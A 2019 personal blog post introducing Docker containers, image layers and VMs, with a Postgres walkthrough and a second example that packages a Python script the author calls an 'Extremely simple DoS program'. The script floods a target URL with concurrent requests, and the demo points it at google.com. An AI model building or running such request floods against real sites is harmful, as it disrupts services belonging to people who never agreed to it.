---
date: "2019-09-29"
title: "Fun with Container"
category: "🐳"
---

Have been working with Docker things for couple months.
<br />
Can't wait to share some amazing things people can do with Docker container.
<br />
<br />

### What is container ?

Well, from <a href="https://www.docker.com/resources/what-container" target="__blank">the official docker documentation</a>

> A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another. 

One real world example is developers can use container to package their development environment setups
which standardizes testing or deployment pipelines.

### What is container image ?

> A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries and settings.

A Docker image is built up from a series of layers. Each layer represents an instruction in the image’s Dockerfile. Each layer except the very last one is read-only.
<br />
Considering Dockerfile below
```Dockerfile
FROM ubuntu:15.04
COPY . /app
RUN make /app
CMD python /app/app.py
```
Each commands will create a new layer. Layers are stacked on top of each other.
<br />
<br />
![alt text](https://storage.googleapis.com/warrenlee/myBlog/docker/container-layers.jpg)

The major difference between a container and an image is the top writable layer. All writes to the container that add new or modify existing data are stored in this writable layer. When the container is deleted, the writable layer is also deleted. The underlying image remains unchanged.
<br/>
<br/>
![alt text](https://storage.googleapis.com/warrenlee/myBlog/docker/sharing-layers.jpg)



### How about VM ?
Let's take a look at the differences of resources allocations between containers and VMs.
<br />
<br />
![alt text](https://storage.googleapis.com/warrenlee/myBlog/docker/docker-containerized-and-vm-transparent-bg.png)

#### Containers
Containers are an abstraction at the app layer that packages code and dependencies together. Multiple containers can run on the same machine and share the OS kernel with other containers, each running as isolated processes in user space. Containers take up less space than VMs (container images are typically tens of MBs in size), can handle more applications and require fewer VMs and Operating systems.
#### VMs
Virtual machines (VMs) are an abstraction of physical hardware turning one server into many servers. The hypervisor allows multiple VMs to run on a single machine. Each VM includes a full copy of an operating system, the application, necessary binaries and libraries - taking up tens of GBs. VMs can also be slow to boot.

### Let's have some fun
#### Case 1: Database
To pull the image from docker hub
```
docker pull postgres:latest
```
To launch a container based on the image we just pulled
```
docker container run -d -e POSTGRES_PASSWORD=pwd -e POSTGRES_USER=user postgres
```
Type 'docker container ls' to check list running containers. And you should see something like
```
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
546077cdde7e        postgres            "docker-entrypoint.s…"   2 minutes ago       Up 2 minutes        5432/tcp            intelligent_dijkstra
```
And use the command below to interact with db console
```
docker container exec -it CONTAINER_ID psql -U user
```
<br/>

#### Case 2: Integrate with a simple Python Task
Here we're going to create a very simple python program and execute it in a container

##### main.py
```py
import sys
import argparse
from requests_futures.sessions import FuturesSession

def pre_response_hook(n):
  def response_hook(resp, *args, **kwargs):
    print('Got response from %sth request' % n)
  return response_hook

def main():
  parser = argparse.ArgumentParser(description='Extremely simple DoS program')
  parser.add_argument('--workers', '-w', default=1, help='number of workers')
  parser.add_argument('--url', '-u', help='target URL')
  parser.add_argument('--number', '-n', default=1, help='number of requests')
  args = parser.parse_args()
  if args.url:
    num_of_workers = int(args.workers)
    num_of_requests = int(args.number)
    url = args.url
    print('Number of workers %d' % num_of_workers)
    print('Number of requests %d' % num_of_requests)
    print('Target URL: %s' % url)
    session = FuturesSession(max_workers=num_of_workers)
    print('Attacking...')
    responses = (session.get(url, hooks={
        'response': pre_response_hook(i+1)
    }) for i in range(num_of_requests))
    for response in responses:
      response.result()
      
if __name__ == '__main__':
  main()
```
<br />

##### requirements.txt
```
requests_futures==1.0.0
```
<br />

##### Dockerfile
```
FROM python:3.7

WORKDIR /app

COPY requirements.txt ./
RUN pip install --no-cache-dir -r requirements.txt

COPY . .
```
<br />

And then we can build the custom image using the command below
```
docker build -t simple-dos .
```
Make sure we have image built by checking '<b>docker image ls</b>'
```
REPOSITORY  TAG     IMAGE ID      CREATED         SIZE
simple-dos  latest  f04502450e6b  3 minutes ago   926MB
```
The final step will be launching a container given arguments
```
docker run --rm simple-dos python main.py -u google.com -n 100 -w 5
```

The result will be something like
```
Number of workers 5
Number of requests 100
Target URL: google.com
Attacking...
Got response from 1th request
Got response from 2th request
Got response from 3th request
Got response from 4th request
Got response from 5th request
...
```
